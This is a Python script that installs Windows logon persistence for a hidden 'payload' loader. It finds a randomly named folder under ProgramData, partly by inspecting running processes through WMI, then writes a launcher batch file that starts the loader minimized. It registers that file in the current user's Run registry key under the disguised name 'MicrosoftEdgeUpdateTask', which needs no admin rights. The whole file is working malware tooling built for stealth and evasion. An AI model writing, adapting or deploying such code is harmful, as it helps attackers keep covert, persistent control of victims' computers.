#!/usr/bin/env python3
"""
HKCU Run key persistence for the bundled Python loader.

Usage:
    python.exe persistence.py <payload_folder>

    <payload_folder> = the folder under %ProgramData% that holds python.exe
                       and lo\\loader.py (passed by run.ps1 as $extractTo)

If the argument is missing or invalid, the script falls back to
auto-discovery (process inspection, then filesystem scan).
"""

import os
import sys
import re
import winreg
import subprocess
from pathlib import Path


# ============================================================
#  Folder discovery
# ============================================================

def resolve_folder():
    """
    Determine the payload folder.
    Order:
      1. argv[1] (passed by run.ps1)
      2. PAYLOAD_DIR env var (set by loader.py if it runs us)
      3. WMI inspection of running python.exe
      4. Filesystem scan of ProgramData
    """
    # 1. Command-line argument
    if len(sys.argv) > 1:
        arg = sys.argv[1].strip('"').strip("'")
        if os.path.isdir(arg):
            return arg

    # 2. Environment variable
    env = os.environ.get("PAYLOAD_DIR")
    if env and os.path.isdir(env):
        return env

    # 3. Running process inspection
    found = _folder_from_running_python()
    if found:
        return found

    # 4. Filesystem scan
    found = _folder_by_scan()
    if found:
        return found

    return None


def _folder_from_running_python():
    """Ask WMI for python.exe command lines and extract the folder from loader.py path."""
    ps_cmd = (
        "Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" | "
        "Select-Object -ExpandProperty CommandLine"
    )
    try:
        out = subprocess.check_output(
            ["powershell.exe", "-NoProfile", "-Command", ps_cmd],
            text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception:
        return None

    for line in out.splitlines():
        matches = re.findall(r'"([^"]+)"', line)
        for m in matches:
            if m.lower().endswith("loader.py") and os.path.isfile(m):
                return os.path.dirname(os.path.dirname(m))  # ...\lo\ -> parent
    return None


def _folder_by_scan():
    """Walk ProgramData for our 12-char folder that contains python.exe + loader.py."""
    pd = os.environ.get("ProgramData", r"C:\ProgramData")
    try:
        for entry in os.scandir(pd):
            if not entry.is_dir():
                continue
            name = entry.name
            if len(name) != 12:
                continue
            if not all(c.isdigit() or c.islower() for c in name):
                continue
            if _has_python(entry.path) and _has_loader(entry.path):
                return entry.path
    except PermissionError:
        pass
    return None


def _has_python(folder):
    for root, _, files in os.walk(folder):
        if "python.exe" in files:
            try:
                if os.path.getsize(os.path.join(root, "python.exe")) < 200 * 1024:
                    if any(f.startswith("python3") and f.endswith(".dll")
                           for f in os.listdir(root)):
                        return True
            except OSError:
                pass
    return False


def _has_loader(folder):
    for root, _, files in os.walk(folder):
        if "loader.py" in files:
            return True
    return False


# ============================================================
#  Locate python.exe and loader.py inside the folder
# ============================================================

def find_python_exe(folder):
    for root, _, files in os.walk(folder):
        if "python.exe" not in files:
            continue
        exe = os.path.join(root, "python.exe")
        try:
            if os.path.getsize(exe) >= 200 * 1024:
                continue  # py.exe launcher stub, skip
            if any(f.startswith("python3") and f.endswith(".dll")
                   for f in os.listdir(root)):
                return exe
        except OSError:
            pass
    return None


def find_loader_py(folder):
    for root, _, files in os.walk(folder):
        if "loader.py" in files:
            return os.path.join(root, "loader.py")
    return None


# ============================================================
#  Persistence installer (HKCU Run key + launcher .cmd)
# ============================================================

def install_run_key(python_exe, loader_py, value_name="MicrosoftEdgeUpdateTask"):
    """
    Write a launcher .cmd next to loader.py, then point HKCU Run at it.
    Requires no admin. Fires on every interactive logon.
    """
    script_dir = str(Path(loader_py).parent)
    launcher   = os.path.join(script_dir, "launch.cmd")

    # 1. Write the launcher batch file
    try:
        with open(launcher, "w", newline="\r\n") as f:
            f.write("@echo off\r\n")
            f.write(f'cd /d "{script_dir}"\r\n')
            f.write(f'start /min "" "{python_exe}" "{loader_py}"\r\n')
    except OSError as e:
        return False, f"launcher write failed: {e}"

    # 2. Write the HKCU Run registry value
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
        ) as k:
            winreg.SetValueEx(k, value_name, 0, winreg.REG_SZ, launcher)
        return True, f"{value_name} -> {launcher}"
    except OSError as e:
        return False, f"registry write failed: {e}"


# ============================================================
#  Main
# ============================================================

def main():
    folder = resolve_folder()
    if not folder:
        print("[-] Could not locate payload folder")
        print("    Usage: python.exe persistence.py <payload_folder>")
        sys.exit(1)

    python_exe = find_python_exe(folder)
    if not python_exe:
        print(f"[-] No real python.exe found under {folder}")
        sys.exit(1)

    loader_py = find_loader_py(folder)
    if not loader_py:
        print(f"[-] No loader.py found under {folder}")
        sys.exit(1)

    print(f"[*] Payload folder : {folder}")
    print(f"[*] Python runtime : {python_exe}")
    print(f"[*] Loader script  : {loader_py}")

    ok, msg = install_run_key(python_exe, loader_py)
    if not ok:
        print(f"[-] Persistence failed: {msg}")
        sys.exit(1)

    print(f"[+] Persistence installed")
    print(f"[+] {msg}")


if __name__ == "__main__":
    main()